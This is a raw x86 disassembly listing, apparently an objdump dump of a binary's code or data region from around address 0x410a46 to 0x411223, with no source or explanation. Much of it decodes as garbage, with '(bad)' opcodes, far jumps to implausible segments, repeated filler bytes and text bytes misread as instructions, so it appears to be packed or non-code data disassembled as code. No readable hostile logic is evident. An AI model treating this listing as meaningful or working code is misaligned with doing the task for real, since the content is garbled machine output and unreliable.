  410a46:	add    BYTE PTR [eax],al
  410a48:	or     al,dl
  410a4a:	rol    esp,0xe8
  410a4d:	push   0xffffffdc
  410a4f:	shr    BYTE PTR [edi],1
  410a51:	loopne 0x4109f4
  410a53:	mov    ds:0x9b93013c,eax
  410a58:	es ficom WORD PTR es:[eax]
  410a5c:	pop    eax
  410a5d:	outs   dx,BYTE PTR ds:[esi]
  410a5e:	cmp    ebp,ebx
  410a60:	add    BYTE PTR [eax],al
  410a62:	add    BYTE PTR ds:0xac2bbe85,cl
  410a68:	or     eax,0x220bcf77
  410a6d:	xor    dh,0x64
  410a70:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  410a71:	pop    eax
  410a72:	jns    0x4109fb
  410a74:	or     dl,bh
  410a76:	ja     0x410a87
  410a78:	mov    eax,?
  410a7a:	cmp    ecx,DWORD PTR [edi]
  410a7c:	arpl   WORD PTR [eax+0x24],si
  410a7f:	jae    0x410a81
  410a81:	add    BYTE PTR [ebx],cl
  410a83:	(bad)  
  410a84:	mov    ebp,0xe8000000
  410a89:	call   0xe929f376
  410a8e:	call   0x4e17f37b
  410a93:	sub    eax,0x75757575
  410a98:	jne    0x410b0f
  410a9a:	jne    0x410b11
  410a9c:	jne    0x410a9d
  410a9e:	dec    DWORD PTR [ebx+esi*1+0x6202d618]
  410aa5:	outs   dx,BYTE PTR ds:[esi]
  410aa6:	push   ecx
  410aa7:	rcl    BYTE PTR [eax+0x49],0xc7
  410aab:	jb     0x410a37
  410aad:	pop    ebp
  410aae:	ins    BYTE PTR es:[edi],dx
  410aaf:	xchg   eax,ebp
  410ab1:	std    
  410ab2:	clc    
  410ab3:	pusha  
  410ab4:	xchg   esp,eax
  410ab5:	cmp    DWORD PTR [edx+0x147effff],0xffffffff
  410abc:	dec    DWORD PTR [esi*8+0xdaaffff]
  410ac3:	or     BYTE PTR [ecx],cl
  410ac5:	mov    ecx,0x7d3471f1
  410aca:	(bad)  
  410acb:	repz shl BYTE PTR [eax-0x60],0x5d
  410ad0:	xchg   ecx,eax
  410ad1:	mov    dh,0x4d
  410ad3:	push   es
  410ad4:	mov    esp,0xa44d81ab
  410ad9:	(bad)  
  410ada:	call   0x4f0c0626
  410adf:	call   0x85c3f3cc
  410ae4:	scas   eax,DWORD PTR es:[edi]
  410ae5:	or     eax,0x57e64f49
  410aea:	inc    esi
  410aeb:	xchg   ebx,eax
  410aec:	mov    dh,0x43
  410aee:	test   BYTE PTR [eax+0x557d478e],al
  410af4:	and    DWORD PTR [ecx],0x1
  410af7:	add    bh,dh
  410af9:	push   ss
  410afa:	retf   
  410afb:	push   ebp
  410afc:	adc    esi,esp
  410afe:	lock retf 
  410b00:	mov    ah,0x49
  410b02:	inc    ecx
  410b03:	jp     0x410a9a
  410b05:	call   0xe85358f2
  410b0a:	call   0x410bf7
  410b0f:	add    BYTE PTR [eax],al
  410b11:	add    BYTE PTR [eax],al
  410b13:	add    BYTE PTR [eax],al
  410b15:	sbb    BYTE PTR [eax-0x4],cl
  410b18:	test   DWORD PTR [ebp+0x65728585],eax
  410b1e:	jbe    0x410b6f
  410b20:	gs push edi
  410b22:	data16 and ah,BYTE PTR gs:[ebp+0x65]
  410b27:	ins    DWORD PTR es:[edi],dx
  410b28:	je     0x410b6d
  410b2a:	jns    0x410b9a
  410b2c:	popa   
  410b2d:	bound  edi,QWORD PTR [ecx+0x74]
  410b30:	and    ch,BYTE PTR [esi]
  410b32:	arpl   WORD PTR gs:[edx+esi*2+0x20],si
  410b37:	push   ebx
  410b38:	cs jae 0x410ba0
  410b3b:	fs gs cmp al,0x66
  410b3f:	inc    ecx
  410b40:	push   ebx
  410b41:	push   edi
  410b42:	jae    0x410ba9
  410b44:	ins    BYTE PTR es:[edi],dx
  410b45:	ds gs jo 0x410bb5
  410b49:	jb     0x410b6d
  410b4b:	and    BYTE PTR [esi+0x52],ch
  410b4e:	push   ebx
  410b4f:	jbe    0x410bc0
  410b51:	or     ah,BYTE PTR [ebp+0x6e]
  410b54:	gs jb  0x410bc9
  410b57:	ins    DWORD PTR es:[edi],dx
  410b58:	gs cs push edi
  410b5b:	outs   dx,BYTE PTR ds:[esi]
  410b5c:	jb     0x410bb1
  410b5e:	push   ebx
  410b5f:	inc    edi
  410b60:	imul   esi,DWORD PTR [edx+0x6f],0x20666d79
  410b67:	gs gs gs gs gs jns 0x410bc1
  410b6e:	inc    ebx
  410b6f:	outs   dx,DWORD PTR ds:[esi]
  410b70:	jns    0x410bd7
  410b72:	or     ah,BYTE PTR [eax]
  410b74:	jb     0x410b96
  410b76:	arpl   WORD PTR [edi+0x20],dx
  410b79:	or     ch,BYTE PTR [ecx]
  410b7b:	das    
  410b7c:	je     0x410bec
  410b7e:	gs gs jae 0x410b07
  410b82:	test   DWORD PTR [ebp+0x4048585],eax
  410b88:	sub    BYTE PTR [eax+esi*4+0x73],ah
  410b8c:	lds    edi,FWORD PTR [eax-0x64]
  410b8f:	test   BYTE PTR [edx-0x2cc6ba01],dl
  410b95:	add    bh,ah
  410b97:	fwait
  410b98:	add    ebx,edx
  410b9a:	push   sp
  410b9c:	retf   0x7a04
  410b9f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410ba0:	add    al,0x4
  410ba2:	pop    edx
  410ba3:	lea    eax,ds:0x49fdf294
  410ba9:	inc    esp
  410baa:	and    DWORD PTR [eax+edi*2+0x67],ebx
  410bae:	lods   eax,DWORD PTR ds:[esi]
  410baf:	icebp  
  410bb0:	pop    edx
  410bb1:	mov    al,ds:0x4e01ed54
  410bb6:	addr16 loopne 0x410c1b
  410bb9:	pop    ss
  410bba:	cmp    BYTE PTR [ebx+0x7b],cl
  410bbd:	jno    0x410baa
  410bbf:	add    al,0x4
  410bc1:	repz and eax,0x14040492
  410bc7:	fist   DWORD PTR [edx+0x4]
  410bca:	int3   
  410bcb:	hlt    
  410bcc:	test   al,0x75
  410bce:	or     al,0xf3
  410bd0:	jp     0x410bcf
  410bd2:	pop    esp
  410bd3:	out    dx,al
  410bd4:	cwde   
  410bd5:	cli    
  410bd6:	cli    
  410bd7:	or     DWORD PTR [eax+0x4c],esi
  410bda:	call   0x94e0:0x900f42f3
  410be1:	and    BYTE PTR [eax+0x38cccccc],bl
  410be7:	cs int3 
  410be9:	int3   
  410bea:	in     al,dx
  410beb:	aad    0xcc
  410bed:	int3   
  410bee:	int3   
	...
  410bf7:	add    BYTE PTR [esi],ch
  410bf9:	test   BYTE PTR [ebx-0x6a723c18],bl
  410bff:	loopne 0x410c2b
  410c01:	ror    ah,0xc3
  410c04:	ffree  st(0)
  410c06:	inc    esp
  410c07:	and    ebp,esp
  410c09:	push   ss
  410c0a:	in     eax,dx
  410c0b:	mov    al,0xee
  410c0d:	arpl   WORD PTR [edx],si
  410c0f:	lods   al,BYTE PTR ds:[esi]
	...
  410c18:	add    BYTE PTR [eax],al
  410c1a:	add    BYTE PTR [ecx+0x45],ah
  410c1d:	fxsave [eax]
  410c20:	add    BYTE PTR [edi-0x2520ceb6],al
  410c26:	fnstsw WORD PTR [ebx]
  410c28:	mov    bh,0xb
  410c2a:	je     0x410c4a
  410c2c:	mov    dl,0x5e
  410c2e:	fstp   TBYTE PTR [ecx-0x65f75ac9]
  410c34:	fisub  DWORD PTR [ebp-0x182c6e3d]
  410c3a:	mov    ds:0x5650a754,eax
  410c3f:	mov    ebx,0x6d133d74
  410c44:	add    BYTE PTR [eax],al
  410c46:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410c47:	stc    
  410c48:	add    BYTE PTR [eax],al
  410c4a:	dec    edi
  410c4b:	mov    dl,0x82
  410c4d:	add    BYTE PTR [eax],al
  410c4f:	mov    esp,0x55a7647d
  410c54:	(bad)  
  410c55:	pop    ecx
  410c56:	mov    ds:0x600015d7,eax
  410c5b:	lock add esp,DWORD PTR [ecx]
  410c5e:	lahf   
  410c5f:	repnz pop esp
  410c61:	stos   BYTE PTR es:[edi],al
  410c62:	jnp    0x410c7e
  410c64:	loop   0x410c91
  410c66:	repnz add BYTE PTR [eax],al
  410c69:	add    BYTE PTR [edx],ch
  410c6b:	outs   dx,DWORD PTR ds:[esi]
  410c6c:	rcr    DWORD PTR [esi-0x65],cl
  410c6f:	test   eax,0x73173040
  410c74:	test   BYTE PTR ds:0xc9e45067,0x55
  410c7b:	or     BYTE PTR [esi],ch
  410c7d:	push   ebx
  410c7e:	mov    esp,0x97970304
  410c83:	fild   QWORD PTR [ebp+0x985b]
  410c89:	(bad)  
  410c8a:	cld    
  410c8b:	xchg   esp,eax
  410c8c:	add    BYTE PTR [eax],al
  410c8e:	add    BYTE PTR [eax],cl
  410c90:	or     BYTE PTR [eax],cl
  410c92:	or     BYTE PTR [eax],cl
  410c94:	or     BYTE PTR [eax],cl
  410c96:	or     BYTE PTR [eax],cl
  410c98:	ror    DWORD PTR [eax+0x757575a8],1
  410c9e:	jne    0x410d15
  410ca0:	jne    0x410d17
  410ca2:	jne    0x410d19
  410ca4:	add    DWORD PTR [ebx+0x2296e47],0xffffffd8
  410cab:	push   ds
  410cac:	dec    edi
  410cad:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410cae:	mov    BYTE PTR [eax],dl
  410cb0:	inc    esp
  410cb1:	mov    ebp,0x153ec7f9
  410cb6:	mov    ds:0xfa49d7ca,eax
  410cbb:	ins    BYTE PTR es:[edi],dx
  410cbc:	retf   0x8332
  410cbf:	and    DWORD PTR [edx-0x317c7c2d],0xffffffa9
  410cc6:	add    DWORD PTR [ebx+0x264e0b65],0x7f
  410ccd:	lahf   
  410cce:	dec    ecx
  410ccf:	adc    BYTE PTR [esi-0x59],dl
  410cd2:	clc    
  410cd3:	add    DWORD PTR [eax+0x2f8926a4],edi
  410cd9:	and    al,BYTE PTR [ecx+ebx*8+0x54]
  410cdd:	mov    ds:0x45835ed6,al
  410ce2:	ss (bad) 
  410ce4:	jmp    0x410c85
  410ce6:	inc    ebp
  410ce7:	inc    ebp
  410ce8:	inc    ebp
  410ce9:	mov    al,BYTE PTR [ecx-0x37468606]
  410cef:	add    al,0x12
  410cf1:	jb     0x410d04
  410cf3:	inc    esi
  410cf4:	jl     0x410c7d
  410cf6:	cmp    bl,BYTE PTR [eax+0x7cb072c8]
  410cfc:	repz mov ebp,0x53bcb251
  410d02:	adc    esp,DWORD PTR [edi-0x4c]
  410d05:	(bad)  
  410d06:	cs inc edi
  410d08:	jmp    0xf445:0x457f21b7
  410d0f:	sub    eax,0x454545
	...
  410d1c:	dec    edx
  410d1d:	push   esp
  410d1e:	out    0x4,al
  410d20:	add    al,0x4
  410d22:	add    al,0x4
  410d24:	add    al,0x4
  410d26:	add    al,0x4
  410d28:	jne    0x410d9f
  410d2a:	xchg   esi,eax
  410d2b:	mov    al,ds:0xd0e89d7a
  410d30:	jle    0x410d7d
  410d32:	gs xchg ebx,eax
  410d34:	icebp  
  410d35:	dec    edx
  410d36:	pop    ss
  410d37:	mov    ecx,0x66b36ffe
  410d3c:	lahf   
  410d3d:	mov    ebp,0x83f94e80
  410d42:	jne    0x410db9
  410d44:	push   ebp
  410d45:	inc    edx
  410d46:	mov    ch,0xa4
  410d48:	fwait
  410d49:	xchg   ecx,eax
  410d4a:	sub    dl,BYTE PTR [ecx-0x39b197d7]
  410d50:	or     BYTE PTR [edx],bl
  410d52:	in     al,dx
  410d53:	mov    eax,ds:0x76e9e096
  410d58:	mov    ds:0xa0420b33,eax
  410d5d:	jl     0x410d24
  410d5f:	sub    DWORD PTR [ebp+0x75],edx
  410d62:	jne    0x410d64
  410d64:	pop    esp
  410d65:	pop    es
  410d66:	jne    0x410ddd
  410d68:	cld    
  410d69:	stos   DWORD PTR es:[edi],eax
  410d6a:	inc    ebx
  410d6b:	jne    0x410d6d
  410d6d:	popf   
  410d6e:	imul   BYTE PTR [edx+0x69effc9]
  410d74:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410d75:	push   ds
  410d76:	xor    DWORD PTR [esi+0x48],0xbf30fe99
  410d7d:	mov    edx,0x4f4330a2
  410d83:	mov    BYTE PTR [esi+0x0],ah
  410d86:	add    BYTE PTR [eax],al
  410d88:	cmp    esp,ebx
  410d8a:	add    BYTE PTR [eax],al
  410d8c:	movs   BYTE PTR es:[edi],BYTE PTR es:[esi]
	...
  410d9a:	(bad)  
  410d9b:	dec    esp
  410d9c:	adc    al,0xae
  410d9e:	(bad)  
  410d9f:	mov    edi,0x5773d632
  410da4:	mov    DWORD PTR [edx-0xb9f0808],esp
  410daa:	clc    
  410dab:	xor    al,dh
  410dad:	dec    ebp
  410dae:	fbstp  TBYTE PTR [ecx+edi*2-0x31]
  410db2:	xor    esi,DWORD PTR [ebx]
  410db4:	xor    esi,DWORD PTR [ebx]
  410db6:	xor    esi,DWORD PTR [ebx]
  410db8:	xor    esi,DWORD PTR [ebx]
  410dba:	xor    eax,DWORD PTR [eax]
  410dbc:	add    cl,cl
  410dbe:	dec    ebx
  410dbf:	or     eax,ecx
  410dc1:	add    BYTE PTR [eax],al
  410dc3:	mov    dh,0xc8
  410dc5:	or     al,0xac
  410dc7:	jmp    0x7980:0x51a96aa2
  410dce:	mov    ah,0xc5
  410dd0:	or     al,0xd2
  410dd3:	jae    0x410df3
  410dd5:	xlat   BYTE PTR ds:[ebx]
  410dd6:	scas   al,BYTE PTR es:[edi]
  410dd7:	xchg   DWORD PTR [esi-0x3d],ebx
  410dda:	cmp    dh,ch
  410ddc:	pop    edi
  410ddd:	jmp    0x410d6f
  410ddf:	pop    ecx
  410de0:	daa    
  410de1:	sub    DWORD PTR [ecx+0x60],edx
  410de4:	jp     0x410db0
  410de6:	add    BYTE PTR [eax],al
  410de8:	mov    dl,0x3b
  410dea:	add    BYTE PTR [eax],al
  410dec:	fs xchg ecx,eax
  410dee:	jns    0x410df0
  410df0:	mov    esi,DWORD PTR [edx+0x6be6e540]
  410df6:	mov    esp,0xfdd045e
  410dfb:	data16 or al,0x2d
  410dfe:	push   edx
  410dff:	push   ss
  410e00:	jns    0x410d85
  410e02:	stos   BYTE PTR es:[edi],al
  410e03:	jl     0x410e5d
  410e05:	std    
  410e06:	les    edi,FWORD PTR [eax-0x7474742e]
  410e0c:	in     eax,dx
  410e0d:	mov    ah,0x4f
  410e0f:	inc    ebx
  410e10:	push   ebx
  410e11:	inc    edx
  410e12:	sahf   
  410e13:	push   esp
  410e14:	push   ss
  410e15:	and    BYTE PTR [ebp+edx*8-0x5d],ch
  410e19:	and    ah,BYTE PTR [edi]
  410e1b:	jl     0x410e00
  410e1d:	mov    ch,0x69
  410e1f:	pusha  
  410e20:	not    DWORD PTR [ecx+0x6]
  410e23:	adc    eax,0x15248e1c
  410e28:	or     DWORD PTR [ebx-0x2a030e75],0xffffff8b
  410e2f:	mov    ecx,DWORD PTR [ebx+0x0]
  410e35:	add    BYTE PTR [eax],al
  410e37:	add    BYTE PTR [eax],al
  410e39:	add    BYTE PTR [ecx-0x76765aec],cl
  410e3f:	mov    DWORD PTR [ecx-0x76767677],ecx
  410e45:	mov    DWORD PTR [eax],eax
  410e47:	add    BYTE PTR [ecx-0x49],dl
  410e4a:	sbb    eax,0x401de437
  410e4f:	pop    esp
  410e50:	mov    ch,0xb2
  410e52:	or     eax,0x430ef49f
  410e57:	fwait
  410e58:	out    dx,al
  410e59:	test   BYTE PTR [ebp+0x4ae5fe0c],dh
  410e5f:	add    BYTE PTR ds:[eax],al
  410e62:	pusha  
  410e63:	js     0x410e65
  410e65:	add    BYTE PTR [edi],al
  410e67:	jecxz  0x410e69
  410e69:	add    BYTE PTR [edi+0x7819fd56],bl
  410e6f:	or     ch,BYTE PTR [ebx+0x2073296e]
  410e75:	dec    esi
  410e76:	push   ebx
  410e77:	and    BYTE PTR [eax+0x65],dh
  410e7a:	outs   dx,DWORD PTR ds:[esi]
  410e7b:	imul   esi,DWORD PTR [ecx+ebp*2+0x69],0x41686622
  410e83:	and    ah,BYTE PTR cs:[edx+0x72]
  410e87:	jbe    0x410ef8
  410e89:	popa   
  410e8a:	gs inc ecx
  410e8c:	je     0x410eae
  410e8e:	ins    BYTE PTR es:[edi],dx
  410e8f:	jb     0x410f00
  410e91:	inc    ecx
  410e92:	cmp    al,0x61
  410e94:	and    BYTE PTR [ebx+0x73],ah
  410e97:	sub    DWORD PTR [ebx+0x44],esp
  410e9a:	bound  esp,QWORD PTR [edx+0x41]
  410e9d:	outs   dx,BYTE PTR gs:[esi]
  410e9f:	jno    0x410ec1
  410ea1:	arpl   WORD PTR [di+0x41],sp
  410ea5:	or     eax,0x73656544
  410eaa:	imul   esp,DWORD PTR [ecx+0x63],0x53
  410eae:	gs gs cs gs js 0x410f2a
  410eb4:	and    BYTE PTR [ebx+0x65],dh
  410eb7:	je     0x410ee2
  410eb9:	push   ebx
  410eba:	das    
  410ebb:	arpl   WORD PTR [ebx+esi*2],di
  410ebe:	push   0x6d0d6172
  410ec3:	bound  esp,QWORD PTR [edx+0x63]
  410ec6:	ins    DWORD PTR es:[edi],dx
  410ec7:	cs cmp al,0x74
  410eca:	dec    ebp
  410ecb:	ins    BYTE PTR es:[edi],dx
  410ecc:	and    dh,BYTE PTR [esp+esi*2+0x4d]
  410ed0:	cs push 0x6e6f536d
  410ed6:	jb     0x410f2f
  410ed8:	ja     0x410f09
  410eda:	sbb    bh,BYTE PTR gs:[ecx+0x61]
  410ede:	push   cs
  410edf:	out    dx,al
  410ee0:	jo     0x410f21
  410ee2:	cmps   DWORD PTR cs:[esi],DWORD PTR es:[edi]
  410ee4:	xchg   ecx,eax
  410ee5:	test   DWORD PTR [eax],0x3727e91c
  410eeb:	add    BYTE PTR es:[eax],al
  410eee:	loopne 0x410f53
  410ef0:	cdq    
  410ef1:	mov    dl,0x0
  410ef3:	add    BYTE PTR [eax],al
  410ef5:	or     esp,DWORD PTR [esi]
  410ef7:	cmc    
  410ef8:	pop    edi
  410ef9:	clc    
  410efa:	xor    BYTE PTR [esi],0xbb
  410efd:	adc    eax,0xd5e069b9
  410f02:	pop    esi
  410f04:	cmp    ecx,DWORD PTR [ecx-0x71]
  410f07:	xchg   ebx,eax
  410f08:	pop    ebx
  410f09:	jecxz  0x410ee1
  410f0b:	outs   dx,DWORD PTR ds:[esi]
  410f0c:	mov    BYTE PTR [esi+edx*4],bh
  410f0f:	xchg   ebx,eax
  410f10:	pop    es
  410f11:	mov    cl,BYTE PTR [ebx+eiz*2+0x2ea45b7d]
  410f18:	add    BYTE PTR [eax],al
  410f1a:	in     al,dx
  410f1b:	add    BYTE PTR cs:[eax],al
  410f1e:	add    BYTE PTR [ecx-0x76767677],cl
  410f24:	mov    DWORD PTR [ecx+0x259b8989],ecx
  410f2a:	push   edx
  410f2b:	add    al,0x4
  410f2d:	add    al,0x4
  410f2f:	add    al,0x4
  410f31:	add    al,0x4
  410f33:	add    al,0x0
  410f35:	add    BYTE PTR [ecx+eax*4],dh
  410f38:	jl     0x410f47
  410f3a:	mov    bl,BYTE PTR [edi]
  410f3c:	lds    eax,FWORD PTR [ebp+0x3c938acf]
  410f42:	sbb    eax,0xb032889a
  410f47:	xchg   ecx,eax
  410f48:	sub    BYTE PTR [edx+0x45],al
  410f4b:	add    eax,0x555e
  410f50:	jae    0x410eee
  410f52:	je     0x410f77
  410f54:	(bad)  
  410f55:	dec    esp
  410f56:	jmp    0x410f8f
  410f58:	xor    al,0x72
  410f5a:	mov    edi,0xd121d4b9
  410f5f:	jle    0x410f87
  410f61:	enter  0x6e5d,0x9b
  410f65:	mov    ecx,0x4f94e315
  410f6a:	push   edx
  410f6b:	pop    ecx
  410f6c:	mov    al,BYTE PTR [eax]
  410f6e:	add    BYTE PTR [esi+eax*4+0x33000099],ch
  410f75:	mov    ds:0x7fff002c,eax
  410f7a:	nop
  410f7b:	cdq    
  410f7c:	xchg   esi,eax
  410f7d:	int    0x63
  410f7f:	imul   edx,DWORD PTR [eax+0x79],0xffffffb6
  410f83:	fld    DWORD PTR [edx]
  410f85:	inc    esi
  410f86:	sti    
  410f87:	out    dx,eax
  410f88:	ret    0x9c
  410f8b:	xchg   ecx,eax
  410f8c:	mov    al,ds:0xe32604e9
  410f91:	(bad)  
  410f92:	(bad)  
  410f93:	jmp    FWORD PTR [edi]
  410f95:	push   ds
  410f96:	(bad)  
  410f97:	jmp    DWORD PTR [eax-0x4a]
	...
  410fa5:	add    bh,ch
  410fa7:	nop
  410fa8:	cmps   WORD PTR ds:[esi],WORD PTR es:[edi]
  410faa:	call   0xf785:0x3f8289af
  410fb1:	je     0x41101a
  410fb3:	dec    esp
  410fb4:	mov    al,0x47
  410fb6:	test   DWORD PTR [edi-0x4a],ebx
  410fb9:	mov    dh,0x39
  410fbb:	pusha  
  410fbc:	xor    al,0xe8
	...
  410fc6:	add    BYTE PTR [ebx+0x2f9d298b],cl
  410fcc:	dec    ebx
  410fcd:	mov    ecx,DWORD PTR [ebx+0x3b65523c]
  410fd3:	mov    ebx,0x337eeaf1
  410fd8:	push   ebx
  410fd9:	fadd   DWORD PTR [edx+ecx*4+0x3b2b147a]
  410fe0:	jge    0x41101a
  410fe2:	mov    edx,0x42664cc6
  410fe7:	lahf   
  410fe8:	jne    0x410f88
  410fea:	sahf   
  410feb:	sub    al,0x1a
  410fed:	imul   edi,DWORD PTR [eax],0xffffffb1
  410ff0:	xchg   edi,eax
  410ff1:	pop    ebp
  410ff2:	mov    ecx,DWORD PTR [ebx-0x74743b72]
  410ff8:	cli    
  410ff9:	jmp    0x411028
  410ffb:	mov    edi,edi
  410ffd:	sbb    ebx,ebx
  410fff:	pop    ebx
  411000:	shl    DWORD PTR [edx],1
  411002:	and    edx,ecx
  411004:	fldcw  WORD PTR [edx-0x7c61deaf]
  41100a:	aam    0x51
  41100c:	popf   
  41100d:	mov    ds:0xcd87da13,eax
  411012:	ret    
  411013:	outs   dx,DWORD PTR ds:[esi]
  411014:	scas   eax,DWORD PTR es:[edi]
  411015:	(bad)  
  411016:	(bad)  
  411017:	dec    DWORD PTR [edi+0x77]
  41101a:	imul   ecx,ebx,0xffffffa4
  41101d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41101e:	adc    DWORD PTR [eax-0x3b6b50bb],ebp
  411024:	jo     0x410fbc
  411026:	fs sti 
  411028:	add    edx,DWORD PTR [eax+eax*4]
  41102b:	and    al,0x21
  41102d:	inc    ebp
  41102e:	xchg   edi,eax
  41102f:	call   0x9b3b9193
  411034:	fs (bad) 
  411036:	call   FWORD PTR [esi-0xdbd8]
  41103c:	push   DWORD PTR [ebp+0x75]
  41103f:	jne    0x4110b6
  411041:	jne    0x4110b8
  411043:	jne    0x4110ba
  411045:	jne    0x4110c5
  411047:	sti    
  411048:	inc    esi
  411049:	rol    al,0xc0
  41104c:	rol    al,0xc0
  41104f:	rol    al,0xc0
  411052:	add    BYTE PTR [eax],al
  411054:	xchg   edi,eax
  411055:	jge    0x411009
  411057:	ffreep st(7)
  411059:	xor    al,0x0
  41105b:	lea    ebx,[ecx-0x42]
  41105e:	nop
  41105f:	(bad)  
  411060:	mov    dl,dh
  411062:	popa   
  411063:	mov    edx,0x1aed5f59
  411068:	sbb    eax,0x9f6d45
  41106d:	add    dl,ah
  41106f:	int3   
  411070:	add    BYTE PTR [eax],al
  411072:	call   0xc4411095
  411077:	or     eax,0x1eecc72d
  41107c:	pop    edx
  41107d:	imul   esi,ebp,0xe8306171
  411083:	(bad)  
  411084:	push   cs
  411085:	jae    0x411094
  411087:	ins    BYTE PTR es:[edi],dx
  411088:	push   eax
  411089:	dec    dh
  41108b:	loop   0x411092
  41108d:	mov    al,BYTE PTR [eax]
  41108f:	test   eax,ecx
  411091:	hlt    
  411092:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411093:	into   
  411094:	test   DWORD PTR [ebp+0x22a35e85],eax
  41109a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41109b:	call   0xd02c8b38
  4110a0:	xchg   bh,cl
  4110a2:	mov    ebx,0x961f7d87
  4110a7:	addr16 pop esp
  4110a9:	int    0x16
  4110ab:	les    ebx,FWORD PTR [eax+0x1e]
  4110ae:	cmc    
  4110af:	popf   
  4110b0:	jne    0x41105d
  4110b2:	call   0xe0b7:0x591eb58a
  4110b9:	fwait
  4110ba:	test   DWORD PTR [ebp-0x7a7abe2f],eax
  4110c0:	test   DWORD PTR [eax],eax
	...
  4110ca:	fnstcw WORD PTR [esp+edx*2+0x0]
  4110d1:	add    BYTE PTR [eax],al
  4110d3:	add    BYTE PTR [eax],al
  4110d5:	add    BYTE PTR [esp+eax*1],al
  4110d8:	dec    esp
  4110d9:	cmp    al,0xee
  4110db:	not    BYTE PTR [esi]
  4110dd:	lods   al,BYTE PTR ds:[esi]
  4110de:	(bad)  
  4110df:	jge    0x4110f0
  4110e1:	adc    BYTE PTR [ecx-0x679c8417],bl
  4110e7:	icebp  
  4110e8:	es mov esp,0xb068197b
  4110ee:	in     eax,0x44
  4110f0:	add    al,0x4
  4110f2:	imul   ebp,ebx,0x76
  4110f5:	test   eax,0xbf391940
  4110fa:	std    
  4110fb:	add    eax,0x5bc179de
  411100:	mov    bl,0x23
  411102:	mov    cl,0x1c
  411104:	lods   eax,DWORD PTR ds:[esi]
  411105:	stos   DWORD PTR es:[edi],eax
  411106:	sti    
  411107:	out    dx,al
  411108:	mov    al,BYTE PTR cs:[esp+ecx*4]
  41110c:	aaa    
  41110d:	pop    edi
  41110e:	bound  eax,QWORD PTR [esp+eax*1]
  411111:	adc    al,0xd0
  411113:	push   ebx
  411114:	add    al,0x4
  411116:	and    bl,BYTE PTR [edx-0x19fffb33]
  41111c:	fs sbb esi,ecx
  41111f:	jns    0x4110e1
  411121:	sub    BYTE PTR [ecx-0x15],bl
  411124:	xor    eax,0xf9c4833e
  411129:	mov    DWORD PTR [ebx-0x5d06a945],edx
  41112f:	mov    bh,0xed
  411131:	daa    
  411132:	mov    dl,0x0
  411134:	add    BYTE PTR [eax],al
  411136:	dec    ebx
  411137:	int3   
  411138:	add    BYTE PTR [eax],al
  41113a:	cmp    ecx,DWORD PTR [eax+0x75000000]
  411140:	jne    0x4111b7
  411142:	jne    0x4111b9
  411144:	jne    0x4111bb
  411146:	jne    0x4111bd
  411148:	sbb    edi,0x2b
  41114b:	adc    edx,edi
  41114d:	call   0x154b411b
  411152:	cs push cs
  411154:	adc    BYTE PTR [ecx-0x63],ah
  411157:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411158:	inc    edx
  411159:	in     al,dx
  41115a:	mov    esi,0x859fc892
  41115f:	ror    BYTE PTR [ebx-0x74747475],cl
  411165:	mov    ecx,DWORD PTR [ebx+0x50508b8b]
  41116b:	stc    
  41116c:	mov    edi,0x5050c25e
  411171:	cmc    
  411172:	pushf  
  411173:	inc    edx
  411174:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411175:	jg     0x4111cc
  411177:	and    DWORD PTR [ebx+0x32],esi
  41117a:	ret    
  41117b:	fild   QWORD PTR [edi+0x730f6448]
  411181:	dec    esi
  411182:	mov    dl,0xdd
  411184:	popa   
  411185:	lods   al,BYTE PTR ds:[esi]
  411186:	pop    ss
  411187:	inc    edx
  411188:	cmp    dl,al
  41118a:	int    0xfe
  41118c:	jo     0x4111d1
  41118e:	ret    0x8dcd
  411191:	out    0xb6,al
  411193:	pop    eax
  411194:	push   eax
  411195:	push   eax
  411196:	jg     0x41118f
  411198:	push   eax
  411199:	push   eax
  41119a:	rol    al,1
  41119c:	pop    ds
  41119d:	push   eax
  41119e:	push   0xffffffa1
  4111a0:	cmp    eax,0xa9499930
  4111a5:	add    ax,0xe33
  4111a9:	xchg   edi,eax
  4111aa:	mov    al,0x44
  4111ac:	adc    BYTE PTR [edi+0xe64f19e],dl
  4111b2:	jge    0x411144
  4111b4:	daa    
  4111b5:	and    al,0x9
  4111b7:	push   0x6a
  4111b9:	push   0x70
  4111bb:	jp     0x4111f2
  4111bd:	mov    dh,0xa5
  4111bf:	pop    esp
  4111c0:	sub    al,BYTE PTR [eax+edx*8]
  4111c3:	mov    edi,0x7e5b1ce6
  4111c8:	stos   BYTE PTR es:[edi],al
  4111c9:	loop   0x41120b
  4111cb:	push   ebx
  4111cc:	jecxz  0x411160
  4111ce:	addr16 xchg ebp,eax
  4111d0:	dec    ebp
  4111d1:	scas   al,BYTE PTR es:[edi]
  4111d2:	jno    0x411230
  4111d4:	xchg   edx,eax
  4111d5:	xor    al,0x6c
  4111d7:	push   0x6a
  4111d9:	aad    0x25
  4111db:	clc    
  4111dc:	push   0x6a
  4111de:	push   0x0
	...
  4111e8:	pop    esi
  4111e9:	adc    DWORD PTR ds:0x45454545,edx
  4111ef:	inc    ebp
  4111f0:	inc    ebp
  4111f1:	inc    ebp
  4111f2:	inc    ebp
  4111f3:	inc    ebp
  4111f4:	dec    ebp
  4111f5:	outs   dx,BYTE PTR ds:[esi]
  4111f6:	outs   dx,DWORD PTR ds:[esi]
  4111f7:	imul   edi,DWORD PTR [edx+0x41],0x72704344
  4111fe:	and    BYTE PTR [ebp+0x76],ch
  411201:	dec    ebp
  411202:	arpl   WORD PTR cs:[ebx+0x43],si
  411206:	or     ah,BYTE PTR [edx+0x20]
  411209:	popa   
  41120a:	push   ebx
  41120b:	and    BYTE PTR [edi],ch
  41120d:	cs cmp eax,0x696e0d74
  411213:	or     eax,0x773d6953
  411218:	bound  esp,QWORD PTR [eax]
  41121a:	ins    DWORD PTR es:[edi],dx
  41121b:	or     ah,BYTE PTR [eax]
  41121d:	and    BYTE PTR [ecx+0x3c],ah
  411220:	arpl   WORD PTR [eax],sp
  411222:	dec    ecx
  411223:	ins    DWORD PTR es:[edi],dx
